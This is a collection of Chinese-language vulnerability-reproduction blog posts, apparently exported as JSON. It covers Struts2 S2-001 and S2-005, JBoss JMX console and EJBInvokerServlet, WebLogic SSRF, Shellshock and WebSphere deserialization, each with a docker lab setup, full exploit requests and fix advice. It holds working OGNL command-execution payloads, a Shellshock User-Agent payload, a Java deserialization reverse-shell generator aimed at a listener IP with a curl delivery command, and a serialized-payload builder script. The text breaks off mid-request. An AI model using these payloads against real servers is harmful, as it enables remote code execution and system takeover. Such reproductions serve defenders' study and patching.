[{"title":"CVE-2007-4556-Struts2-S2-001-RCE","url":"/2022/11/02/CVE-2007-4556-Struts2-S2-001-RCE/","content":"描述​\t该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %&#123;value&#125; 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。\n影响版本Struts 2.0.0 ～ Struts 2.0.8\n漏洞检测输入%&#123;1+1&#125;，提交返回2\nhttp://192.168.3.100:8080/S2-001/login.action\n\n\n\n环境搭建docker搭建环境：\ndocker pull 2d8ru/struts2docker run -d -p 8080:8080 2d8ru/struts2\n\n\n查看环境\nhttp://192.168.3.100:8080/S2-001/\n\n\n复现过程使用bp抓包，发送以下payload\nPOST /S2-001/login.action HTTP/1.1Host: 192.168.3.100:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 466Origin: http://192.168.3.100:8080Connection: closeReferer: http://192.168.3.100:8080/S2-001/Cookie: JSESSIONID=EDCDD1C2E2D9487432F705F53D17749FUpgrade-Insecure-Requests: 1username=admin&amp;password=%25&#123;%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]&#123;&quot;id&quot;&#125;)).redirectErrorStream(true).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[50000],%23d.read(%23e),%23f%3d%23context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),%23f.getWriter().println(new+java.lang.String(%23e)),%23f.getWriter().flush(),%23f.getWriter().close()&#125;\n\n\n替换命令为whoami\nPOST /S2-001/login.action HTTP/1.1Host: 192.168.3.100:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 466Origin: http://192.168.3.100:8080Connection: closeReferer: http://192.168.3.100:8080/S2-001/Cookie: JSESSIONID=EDCDD1C2E2D9487432F705F53D17749FUpgrade-Insecure-Requests: 1username=admin&amp;password=%25&#123;%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[50000],%23d.read(%23e),%23f%3d%23context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),%23f.getWriter().println(new+java.lang.String(%23e)),%23f.getWriter().flush(),%23f.getWriter().close()&#125;\n\n\n\n\n修复建议1、从 XWork 2.0.4 开始，OGNL 解析已更改，因此它不是递归的。因此，在上面的示例中，结果将是预期的 %{1+1}。获取WebWork 2.0.4或Struts 2.0.9，其中包含更正后的 XWork 库。\n2、获取补丁并将其应用于 XWork 源代码。重启 glassfish 后生效\n","categories":["漏洞复现"],"tags":["Struts2"]},{"title":"CVE-2017-7504-JBossMQ-JMS-Deserialization","url":"/2022/10/19/CVE-2007-1036-JBoss-JMX-Console-Getshell/","content":"描述​\tCVE-2007-1036 即 JMX Console HtmlAdaptor Getshell，因为 JBoss 中 &#x2F;jmx-console&#x2F;HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到 jmx 控制台，并在其中执行任何功能。\n影响版本Jboss AS &#x3D;&lt; 4.x\n环境搭建使用的是vulhub中CVE-2017-7504的漏洞环境来做复现\n#进入漏洞目录cd vulhub/jboss/CVE-2017-7504#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.2.107:8080/\n\n\n复现过程直接访问该地址：http://192.168.3.50:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository\n\n找到下面store函数，通过向四个参数传参，达到上传 shell 的目的。\n其中 arg0 传入的是部署的 war 包名字，arg1 传入的是上传的文件的文件名，arg2 传入的是上传文件的文件格式，arg3 传入的是上传文件中的内容。通过控制这四个参数即可上传 shell，控制整台服务器，arg1 和 arg2 可以进行文件的拼接，例如 arg1&#x3D;she，arg2&#x3D;ll.jsp。这个时候服务器还是会进行拼接，将 shell.jsp 传入到指定路径下。\n\n\n蚁剑连接\n\n\n修复建议1、将JBoss后台添加权限，控制访问者对敏感路径访问\n2、若不使用控制平台管理，建议关闭jmx-console和web-console，提高安全性。删除jmx-console.war和web-console.war，在以下路径。\njboss\\server\\all\\deploy\\jmx-console.warjboss\\server\\default\\deploy\\jmx-console.war\n\n3、目前官方已经发布了升级补丁以修复这个安全问题，请到官网的主页下载：http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1036\n","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"CVE-2010-1870-Struts2-S2-005-RCE","url":"/2022/11/02/CVE-2010-1870-Struts2-S2-005-RCE/","content":"描述​\ts2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。\n影响版本Struts 2.0.0 ～ Struts 2.1.8.1 \n漏洞检测exp如下，执行命令无回显：\n/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1\n\n\n环境搭建docker搭建环境：\ndocker pull 2d8ru/struts2docker run -d -p 8080:8080 2d8ru/struts2\n\n\n查看环境\nhttp://192.168.3.100:8080/S2-005/example/HelloWorld.action\n\n\n复现过程使用bp抓包，发送以下payload\nGET /S2-005/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1Host: 192.168.3.100:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: JSESSIONID=5D23AD82B1C442F32FFFD73388EDECB9Upgrade-Insecure-Requests: 1\n\n\n进入环境，查看是否成功在tmp目录下创建success文件\ndocker psdocker exec -ti 7ba8e842bd91 /bin/bash\n\n\n修复建议1、从 XWork 2.2.1 开始，现在已成为 Struts 2.2.1 发行版的一个组成部分，ParameterInterceptor 已更改为为可接受的非恶意参数名称提供非常严格的白名单机制。 因此，除了简单属性导航路径之外的参数将被忽略。强烈建议升级到包含更正 XWork 库的 Struts 2.2.1。\n2、在struts.xml中配置ParametersIntercptor排除恶意参数，以下额外的拦截器引用配置在正确应用时应该可以缓解问题：\n&lt;interceptor-ref name=&quot;params&quot;&gt;    &lt;param name=&quot;excludeParams&quot;&gt;dojo\\..*,^struts\\..*,.*\\\\.*,.*\\(.*,.*\\).*,.*@.*&lt;/param&gt;&lt;/interceptor-ref&gt;\n\n3、如果要采取手工修复的方式，需要进行以下步骤\n1. 修改目标struts2应用的struts.xml文件，在对应的Action中添加新的拦截器，或拦截器栈，或者直接设置成默认拦截器2. 向目标struts2应用的src源代码中添加新的拦截器实现类3. 重启目标struts2应用进程，使拦截器生效\n","categories":["漏洞复现"],"tags":["Struts2"]},{"title":"CVE-2013-4810-EJBInvokerServlet-Deserialization","url":"/2022/10/20/CVE-2013-4810-EJBInvokerServlet-Deserialization/","content":"描述​\t由于JBoss中invoker&#x2F;EJBInvokerServlet路径对外开放，EJBInvokerServlet 利用的是 org.jboss.invocation.MarshalledValue进行的反序列化操作。\n影响版本JBoss 6.x &gt;&#x3D; \n环境搭建这里使用vulnhub上面CVE-2015-7501的环境来复现该漏洞。\n#进入漏洞目录cd vulhub/jboss/JMXInvokerServlet-deserialization#开启环境docker-compose up -d\n\n\n\n查看环境\nhttp://192.168.3.50:8080/\n\n\n复现过程利用工具下载地址：\nhttps://github.com/joaomatosf/JavaDeserH2HC\n\n通过一下命令可生成一个ser后缀的文件。\njavac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.3.61:2233\n\n\n\nkali监听2233端口\nnc -lvvp 2233\n\n执行exp\ncurl http://192.168.3.50:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n\n\n\n\n修复建议1、删除http-invoker.sar组件。\n2、设置http-invoker，在jboss\\server\\default\\deploy\\http-invoker.sar\\invoker.war\\WEB-INF\\web.xml的security-constraint 标签中添加以下代码。\n&lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n\n3、升级版本\n","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"CVE-2014-4210-Weblogic-SSRF","url":"/2022/10/28/CVE-2014-4210-Weblogic-SSRF/","content":"描述​\tSWeblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。\n影响版本weblogic 10.0.2 – 10.3.6.0\n漏洞检测​\t通过发送指定的包，如果返回里面带有An error has occurred说明存在漏洞。\nPOST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1Host: 192.168.3.80:7001User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 130Origin: http://192.168.3.80:7001Connection: closeReferer: http://192.168.3.80:7001/uddiexplorer/SearchPublicRegistries.jspCookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=yshmjb4PX64L41thzhLyzNcFLL20pQpcvgMJsvCvnY2WbQv7Sk4Q!511156682Upgrade-Insecure-Requests: 1operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search\n\n\n\n\n环境搭建使用vulnhub环境来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/ssrf#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.80:7001/\n\n\n复现过程直接访问以下地址\nhttp://192.168.3.80:7001/uddiexplorer/SearchPublicRegistries.jsp\n\n\n点击Search按钮，通过bp拿到发送的POST数据包，operator中的参数修改为http://127.0.0.1:7001。\n\n再将operator中的参数修改为未开放的端口。\n\n具体的数据包如下\nPOST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1Host: 192.168.3.80:7001User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 130Origin: http://192.168.3.80:7001Connection: closeReferer: http://192.168.3.80:7001/uddiexplorer/SearchPublicRegistries.jspCookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=yshmjb4PX64L41thzhLyzNcFLL20pQpcvgMJsvCvnY2WbQv7Sk4Q!511156682Upgrade-Insecure-Requests: 1operator=http://127.0.0.1:7002&amp;rdoSearch=name&amp;txtSearchname=&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search\n\n\n\n修复建议1、删除server&#x2F;lib&#x2F;uddiexplorer.war下的相应jsp文件。 \n#&gt; jar -xvf uddiexplorer.war #&gt; rm jsp-files #&gt; jar -cvfM uddiexplorer.war uddiexplorer/\n\n2、配置访问权限，取消对外开放。\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"CVE-2014-6271-Shellshock-RCE","url":"/2022/10/27/CVE-2014-6271-Shellshock-RCE/","content":"描述​\tShellshock，又称Bashdoor，是一个安全漏洞，于2014年9月12日被发现，直到9月24日被赋予了CVE编号CVE-2014-6271才得以控制。该漏洞与Bash有关，Bash是一种广泛使用的Unix shell。此漏洞影响所有Linux发行版，并允许使用环境变量远程执行命令。\n影响版本bash &lt;&#x3D; 4.3\n漏洞检测如果在User-Agent中加入一下命令有回显，则说明存在漏洞。\n() &#123; :;&#125;;echo;echo $(/bin/ls -al /);/usr/bin/id;\n\n环境搭建使用vulnhub环境来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/CVE-2020-14882#开启环境docker-compose up -d\n\n\n这里有个问题，直接启动环境访问会报错。\n\n原因是权限不够\n\n查看环境\nhttp://192.168.3.79:8080/victim.cgihttp://192.168.3.79:8080/safe.cgi\n\n\n\n复现过程这里有两个cgi文件提供作为对比。，进入docker环境查看区别主要在于调用的bash版本不一样。\n\n\nbp抓包，修改User-Agent。\n() &#123; :;&#125;;echo;echo $(/bin/ls -al /);/usr/bin/id;\n\n\n修复建议升级bash\n","categories":["漏洞复现"],"tags":["Bash"]},{"title":"CVE-2015-7450-WebSphere-Deserialization","url":"/2022/10/31/CVE-2015-7450-WebSphere-Deserialization/","content":"描述​\tIBM Cognos BI中使用的IBM TCR中存在安全漏洞，该漏洞源于Java InvokerTransformer类没有正确处理数据的反序列化。远程攻击者可借助特制的序列化的Java对象利用该漏洞执行任意命令。\n影响版本IBM Websphere Application Server 6.2\nIBM Websphere Application Server 7.0\n漏洞检测访问以下URL，如果出现一下界面则存在该漏洞。\nhttp://192.168.3.91:8880/\n\n\n环境搭建docker搭建环境：\ndocker pull iscrosales/websphere7docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7\n\n\n\n查看环境\nhttp://192.168.3.91:8880/\n\n\n复现过程手动利用：\npython base64编码脚本\nimport base64from binascii import unhexlifycommand = &quot;执行的命令&quot;serObj = unhexlify(&quotquot;)serObj += (chr(len(command)) + command).encode(&#x27;ascii&#x27;)serObj += unhexlify(&quot;740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A&quot;)serObjB64 = base64.b64encode(serObj).decode()print(serObjB64)\n\n\n\n将输出的serObjB64，替换到如下数据包中的params节点,发送数据包即可执行。\nPOST / HTTP/1.1Host: 192.168.3.91:8880User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeContent-Type: text/xmlSOAPAction: urn:AdminServiceContent-Length: 8868&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;SOAP-ENV:Header ns0:JMXConnectorContext=&quot;rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4&quot; xmlns:ns0=&quot;admin&quot; ns0:WASRemoteRuntimeVersion=&quot;8.5.5.7&quot; ns0:JMXMessageVersion=&quot;1.2.0&quot; ns0:JMXVersion=&quot;1.2.0&quot;&gt;&lt;/SOAP-ENV:Header&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:invoke xmlns:ns1=&quot;urn:AdminService&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;objectname 